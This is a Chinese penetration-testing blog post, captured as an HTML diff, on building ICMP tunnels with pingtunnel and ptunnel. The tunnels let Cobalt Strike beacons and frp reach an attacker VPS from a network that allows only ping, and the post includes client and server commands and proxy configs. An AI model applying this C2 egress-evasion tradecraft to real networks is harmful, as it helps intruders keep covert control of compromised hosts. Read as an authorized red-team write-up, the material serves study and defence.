@@ -1,0 +1,418 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>记一次严苛环境的ICMP隧道 | c0ys</title>
+<link rel="shortcut icon" href="https://c0ys.cn/favicon.ico?v=1656907333431">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://c0ys.cn/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="记一次严苛环境的ICMP隧道 | c0ys - Atom Feed" href="https://c0ys.cn/atom.xml">
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+<meta name="robots" content="nofollow">
+<meta name="googlebot" content="noindex, nofollow">
+<meta name="baiduspider" content="noindex, nofollow">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+
+<script>
+  fetch('https://v1.hitokoto.cn')
+    .then(response => response.json())
+    .then(data => {
+      const hitokoto = document.getElementById('hitokoto_text')
+      hitokoto.href = 'https://hitokoto.cn/?uuid=' + data.uuid
+      hitokoto.innerText = data.hitokoto
+    })
+    .catch(console.error)
+</script>
+
+<script>
+  var _hmt = _hmt || [];
+  (function() {
+    var hm = document.createElement("script");
+    hm.src = "https://hm.baidu.com/hm.js?93f5a2255c8226ec27177b0c251feb9f";
+    var s = document.getElementsByTagName("script")[0]; 
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+  
+    <meta name="description" content="前言
+记录一次比较严苛环境下的隧道，TCP、UDP不出，DNS是自己的内网服务器，DNS也不出网，没有HTTP。只有ping是出网的，但由于系统为windows server 2003 x86 32位系统，极大部分工具都不能使用，特别是go..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://c0ys.cn">
+  <img class="avatar" src="https://c0ys.cn/images/avatar.png?v=1656907333431" alt="">
+  </a>
+  <h1 class="site-title">
+    c0ys
+  </h1>
+  <p class="site-description" id="hitokoto">
+    <a id="hitokoto_text"> 吾心吾行澄如明镜，所作所为皆为正义。</a>
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="https://c0ys.cn/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://c0ys.cn/post/talk" class="menu">
+          留言
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              记一次严苛环境的ICMP隧道
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-05-23
+              </span>
+              <span>
+                8 min read
+              </span>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://bu.dusays.com/2022/06/10/62a2ebeb02808.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="前言">前言</h1>
+<p>记录一次比较严苛环境下的隧道，TCP、UDP不出，DNS是自己的内网服务器，DNS也不出网，没有HTTP。只有ping是出网的，但由于系统为windows server 2003 x86 32位系统，极大部分工具都不能使用，特别是go语言写的程序，兼容性极差，毕竟新语言，能理解。</p>
+<figure data-type="image" tabindex="1"><img src="https://bu.dusays.com/2022/06/10/62a2ebcaf21b1.png" alt="" loading="lazy"></figure>
+<p>其实在v1.12版本就已经出现了不兼容的情况了（现在v1.18），按理说用低版本的go编译或许也能解决，但低于1.13的go没有Go  Module(也就是go mod)解决依赖问题，我也不是很懂go，暂时是陷入了僵局，所以才会找同类软件替代，此处的ptunnel（c编写）替换pingtunel（go）就是，除此之外还用ladon替换fscan。</p>
+<figure data-type="image" tabindex="2"><img src="https://bu.dusays.com/2022/06/10/62a2ebd0b359e.png" alt="" loading="lazy"></figure>
+<h1 id="pingtunnel">Pingtunnel</h1>
+<blockquote>
+<p>go编写，各平台客户端都有。<br>
+客户端一定要管理员/root权限。<br>
+客户端一定要管理员/root权限。<br>
+客户端一定要管理员/root权限。</p>
+</blockquote>
+<p><a href="https://github.com/esrrhs/pingtunnel" title="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p>
+<p>建议：关闭系统默认ping</p>
+<pre><code class="language-python">echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all
+
+</code></pre>
+<h2 id="服务端">服务端</h2>
+<p>vps上开启服务端（注意noprint和nolog两个参数，noprint为调试输出，记录当前连接状况等，nolog为日志输入，将连接状况记录到日志中，如果不需要这两个参数将其置为1即可，此处均置为1）</p>
+<pre><code class="language-python">./pingtunnel -type server -nolog 1 -noprint 1
+</code></pre>
+<h2 id="客户端-socks">客户端 - socks</h2>
+<p>伪装成socks流量的话，cs没法走socks上线，只能再用工具把socks转http流量，再上线cs。</p>
+<pre><code class="language-python">pingtunnel.exe -type client -l :8082 -s 43.1.x.x -sock5 1 -nolog 1 -noprint 1
+</code></pre>
+<p>此时需要将socks5隧道转换为http隧道，用的是cow，goproxy或许也可以。</p>
+<p><a href="https://github.com/cyfdecyf/cow/releases/tag/0.9.8" title="https://github.com/cyfdecyf/cow/releases/tag/0.9.8">https://github.com/cyfdecyf/cow/releases/tag/0.9.8</a></p>
+<p>其中cow的配置文件如下</p>
+<pre><code class="language-python"># 即监听本地socks8082端口，转发到http的1080端口
+listen = http://127.0.0.1:1080
+proxy = socks5://127.0.0.1:8082
+
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://bu.dusays.com/2022/06/10/62a2ebd55f0d4.png" alt="" loading="lazy"></figure>
+<h3 id="上线cs-稳定">上线cs [稳定]</h3>
+<p>上cs的listener设置。</p>
+<figure data-type="image" tabindex="4"><img src="https://bu.dusays.com/2022/06/10/62a2ebded5ecc.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://bu.dusays.com/2022/06/10/62a2ebeb02808.png" alt="" loading="lazy"></figure>
+<blockquote>
+<p>artifact和beacon都能正确执行命令，有回显。</p>
+</blockquote>
+<hr>
+<hr>
+<p>内网上线其他主机，change two 地方。(当然得保证内网tcp通信）</p>
+<figure data-type="image" tabindex="6"><img src="https://bu.dusays.com/2022/06/10/62a2ebf0d3621.png" alt="" loading="lazy"></figure>
+<pre><code class="language-python"># 即监听本地socks8082端口，转发到http的1080端口
+listen = http://0.0.0.0:1080
+proxy = socks5://127.0.0.1:8082
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://bu.dusays.com/2022/06/10/62a2ebf6168eb.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://bu.dusays.com/2022/06/10/62a2ebfa337ce.png" alt="" loading="lazy"></figure>
+<h3 id="上线frp-稳定">上线frp [稳定]</h3>
+<p>加一条参数</p>
+<pre><code class="language-python">[common]
+http_proxy = socks5://127.0.0.1:8082
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://bu.dusays.com/2022/06/10/62a2ec049dc9a.png" alt="" loading="lazy"></figure>
+<p><strong>遇到的问题：</strong></p>
+<ul>
+<li>
+<p>如果客户端连接失败服务端重启试下。怀疑可能是流量太大，不稳定。</p>
+</li>
+<li>
+<p>自己在5g流量+vps 8m带宽条件下，frp稳定性糟糕。只能算是勉强能用，进程还经常崩。</p>
+<p>「怀疑这是因为复现环境都在本机，<strong>所有流量都走了一个出口，导致的延迟。」</strong></p>
+</li>
+</ul>
+<hr>
+<hr>
+<p>不出所料，客户端不在本地搭建，选用vps搭建frp的客户端，操作还是流畅。</p>
+<figure data-type="image" tabindex="10"><img src="https://bu.dusays.com/2022/06/10/62a2ec0d95409.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://bu.dusays.com/2022/06/10/62a2ec13727a1.png" alt="" loading="lazy"></figure>
+<blockquote>
+<p>都是正常通信流量，没有爆红。</p>
+</blockquote>
+<h2 id="客户端-tcp">客户端 - tcp</h2>
+<pre><code class="language-python">pingtunnel.exe -type client -l :8002 -s 43.1.x.x -t 43.1.x.x:9999 -tcp 1 -nolog 1 -noprint 1
+</code></pre>
+<p>上述-s参数指向的服务端vps，-t指向的流量转发的目的地址，两个地址可以为一台，也可以分开。</p>
+<p>由于pingtunnel走tcp只能做到端口转发。此处只演示上线cs。</p>
+<h3 id="上线cs-稳定-2">上线cs [稳定]</h3>
+<p>上线cs的原理，即通过pingtunnel监听本地8002端口，把流量通过ICMP伪装成tcp转发到-t参数的此端口上。</p>
+<p>因此我们需要建立两个listener。</p>
+<figure data-type="image" tabindex="12"><img src="https://bu.dusays.com/2022/06/10/62a2ec1cb107a.png" alt="" loading="lazy"></figure>
+<p>生成ICMP监听的beacon即可。</p>
+<p><strong>遇到的问题：</strong></p>
+<ul>
+<li>
+<p>打开不会及时上线，有时候需要重启pingtunnel客户端才能上一次心跳包。</p>
+<p>「因为网络条件不稳定」</p>
+</li>
+<li>
+<p>只有第一次上线的心跳包</p>
+<p>「这是因为复现环境都在本机，<strong>所有流量都走了一个出口，导致的延迟」</strong></p>
+</li>
+<li>
+<p>artifact可能会失败。</p>
+<p>「这是因为复现环境都在本机，<strong>所有流量都走了一个出口，导致的延迟」</strong></p>
+</li>
+</ul>
+<p>吸取上述问题，这里攻击机vps选用43.x，被控机也选用羔性能 vps 1.116.x.x，注意观察两个session的外网ip。</p>
+<p>artifact的外网ip为1.116.x.x，为正确的出网外网ip。</p>
+<p>beacon的外网ip为43.x，此处是流量走的pingtunnel的服务端。</p>
+<figure data-type="image" tabindex="13"><img src="https://bu.dusays.com/2022/06/10/62a2ec2062344.png" alt="" loading="lazy"></figure>
+<blockquote>
+<p>流量分别走的两台vps，操作十分流畅顺滑。</p>
+</blockquote>
+<h1 id="ptunnel">Ptunnel </h1>
+<p>kali，debian类自带。默认只有linux版，windows版(c写的)有魔改哥写好了。</p>
+<p><a href="https://github.com/ptunnel-win/ptunnel" title="https://github.com/ptunnel-win/ptunnel">https://github.com/ptunnel-win/ptunnel</a></p>
+<p>自行编译好后，还要准备wincap包。</p>
+<figure data-type="image" tabindex="14"><img src="https://bu.dusays.com/2022/06/10/62a2ec2413f8b.png" alt="" loading="lazy"></figure>
+<p>这个工具的语法比较绕，这里记录一下。</p>
+<pre><code class="language-python">root@VM-16-9-debian:~# ptunnel -h
+ptunnel v 0.72.
+Usage:   ptunnel -p &lt;addr&gt; -lp &lt;port&gt; -da &lt;dest_addr&gt; -dp &lt;dest_port&gt; [-m max_tunnels] [-v verbosity] [-f logfile]
+         ptunnel [-m max_threads] [-v verbosity] [-c &lt;device&gt;]
+     -p: Set address of peer running packet forwarder. This causes
+         ptunnel to operate in forwarding mode - the absence of this
+         option causes ptunnel to operate in proxy mode.
+    -lp: Set TCP listening port (only used when operating in forward mode)
+    -da: Set remote proxy destination address if client
+         Restrict to only this destination address if server
+    -dp: Set remote proxy destionation port if client
+         Restrict to only this destination port if server
+     -m: Set maximum number of concurrent tunnels
+     -v: Verbosity level (-1 to 4, where -1 is no output, and 4 is all output)
+     -c: Enable libpcap on the given device.
+     -f: Specify a file to log to, rather than printing to standard out.
+     -s: Client only. Enables continuous output of statistics (packet loss, etc.)
+
+Starting the proxy (needs to run as root):
+ [root #] ptunnel
+Starting a client (also needs root):
+ [root #] ptunnel -p proxy.pingtunnel.com -lp 8000 -da login.domain.com -dp 22 -c eth0
+And then using the tunnel to ssh to login.domain.com:
+ [user $] ssh -p 8000 localhost
+And that's it. Enjoy your tunnel!
+</code></pre>
+<h2 id="服务端-2">服务端</h2>
+<p>同上，建议关闭系统默认ping</p>
+<pre><code class="language-python">echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all
+ptunnel
+</code></pre>
+<h2 id="客户端">客户端</h2>
+<p>网上教程粗制滥造，抄来抄去，大部分都是垃圾！！</p>
+<blockquote>
+<p>这个工具本身貌似也只能做到tcp端口转发。本次接触这个工具也是实属无奈，go编译的工具都在win2k3上夭折了。只能找其他。</p>
+</blockquote>
+<pre><code class="language-python">ptunnel.exe -p 124.2.x.x -lp 8082 -da 127.0.0.1 -dp 55743
+</code></pre>
+<p>也就是监听本地的8082端口，转发到-p参数的服务器的-dp端口，也就转发到124.x服务器的55743端口，此处9999端口是cs上线的listen。</p>
+<figure data-type="image" tabindex="15"><img src="https://bu.dusays.com/2022/06/10/62a2ec2be20f2.png" alt="" loading="lazy"></figure>
+<h3 id="上线cs">上线cs</h3>
+<p>由于只看懂了端口转发怎么做，只简单上线cs不多研究，pingtunnel用起来更顺手一些。这里配合其他工具应该也能走socks。</p>
+<figure data-type="image" tabindex="16"><img src="https://bu.dusays.com/2022/06/10/62a2ec2f881e8.png" alt="" loading="lazy"></figure>
+<p><strong>遇到的问题：</strong></p>
+<ul>
+<li>
+<p>artifact无法上线</p>
+</li>
+<li>
+<p>只有第一次上线的心跳包</p>
+</li>
+</ul>
+<blockquote>
+<p>不想解决了，手里只有同事编译的32位windows版本，windows的c环境编译，你懂吧，太麻烦，随它吧，还是pingtunnel好用</p>
+</blockquote>
+<h3 id="ssh">ssh</h3>
+<p>只是证明一下隧道搭建成功。没什么含金量，因为当时时间匆忙又有点急，理解参数踩坑了很久。</p>
+<blockquote>
+<p>真的卡。ssh连一半，信息给一半卡住了。姑且算是我网络条件不好，不是工具的锅。</p>
+</blockquote>
+<figure data-type="image" tabindex="17"><img src="https://bu.dusays.com/2022/06/10/62a2ec33bbcfb.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="18"><img src="https://bu.dusays.com/2022/06/10/62a2ec3f17f00.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="19"><img src="https://bu.dusays.com/2022/06/10/62a2ec584266e.png" alt="" loading="lazy"></figure>
+<pre><code class="language-python">Session statistics:
+[inf]: I/O:   0.00/  0.00 mb ICMP I/O/R:      100/       2/      39 Loss: 19.5%
+</code></pre>
+<p>包全丢完了。玩锤子，平均5个包丢1个。</p>
+
+                <blockquote>
+                  <p>声明：本博客文章所分享内容仅用于技术交流，禁止用于违法途径，所有渗透都需获取授权！否则需自行承担，本站及原作者不承担相应的后果。</p>
+                </blockquote>
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#pingtunnel">Pingtunnel</a>
+<ul>
+<li><a href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF">服务端</a></li>
+<li><a href="#%E5%AE%A2%E6%88%B7%E7%AB%AF-socks">客户端 - socks</a>
+<ul>
+<li><a href="#%E4%B8%8A%E7%BA%BFcs-%E7%A8%B3%E5%AE%9A">上线cs [稳定]</a></li>
+<li><a href="#%E4%B8%8A%E7%BA%BFfrp-%E7%A8%B3%E5%AE%9A">上线frp [稳定]</a></li>
+</ul>
+</li>
+<li><a href="#%E5%AE%A2%E6%88%B7%E7%AB%AF-tcp">客户端 - tcp</a>
+<ul>
+<li><a href="#%E4%B8%8A%E7%BA%BFcs-%E7%A8%B3%E5%AE%9A-2">上线cs [稳定]</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#ptunnel">Ptunnel </a>
+<ul>
+<li><a href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF-2">服务端</a></li>
+<li><a href="#%E5%AE%A2%E6%88%B7%E7%AB%AF">客户端</a>
+<ul>
+<li><a href="#%E4%B8%8A%E7%BA%BFcs">上线cs</a></li>
+<li><a href="#ssh">ssh</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://c0ys.cn/post/MnMuPzF2Q/">
+              <h3 class="post-title">
+                PyStinger毒刺不出网上线CS
+              </h3>
+            </a>
+          </div>
+        
+      
+        
+            <script src="https://cdn.jsdelivr.net/npm/twikoo@1.5.0/dist/twikoo.all.min.js"></script>
+
+<div id="tcomment"></div>
+<script>
+twikoo.init({
+  envId: 'https://talk.c0ys.cn',
+  el: '#tcomment'
+})
+</script> 
+          
+
+        
+
+        <div class="site-footer">
+  Powered by<a href="https://github.com/c0ys" target="_blank">c0ys</a>
+  <a class="rss" href="https://c0ys.cn/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
